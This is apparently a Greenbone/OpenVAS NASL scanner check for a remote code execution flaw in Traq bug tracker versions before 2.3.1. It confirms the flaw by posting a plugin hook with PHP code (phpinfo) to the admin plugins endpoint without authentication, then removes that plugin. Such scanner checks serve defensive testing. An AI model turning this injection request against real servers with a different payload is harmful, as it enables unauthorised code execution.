if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103359" );
	script_bugtraq_id( 50961 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Traq 'authenticate()' Function Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50961" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-12-08 08:05:08 +0100 (Thu, 08 Dec 2011)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for details." );
	script_tag( name: "summary", value: "Traq is prone to a remote code-execution vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to execute arbitrary code with
   admin privileges. Failed exploit attempts will result in a denial-of-service condition." );
	script_tag( name: "affected", value: "Traq versions prior to 2.3.1 are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/traq", "/phptraq", "/bugtracker", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(!buf || !ContainsString( buf, "Powered by Traq" )){
		continue;
	}
	host = http_host_name( port: port );
	filename = NASLString( dir, "/admincp/plugins.php?newhook" );
	ex = "plugin_id=12323&title=1&execorder=0&hook=template_footer&code=phpinfo();die;";
	req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( ex ), "\\r\\n", "Connection: close\\r\\n", "\\r\\n", ex );
	http_keepalive_send_recv( port: port, data: req );
	req = NASLString( "GET ", dir, "/index.php HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Cmd: phpinfo();\\r\\n\\r\\n" );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( result, "<title>phpinfo()" )){
		url = NASLString( dir, "/admincp/plugins.php?remove&plugin=12323" );
		req = http_get( item: url, port: port );
		http_keepalive_send_recv( port: port, data: req );
		report = http_report_vuln_url( port: port, url: filename );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

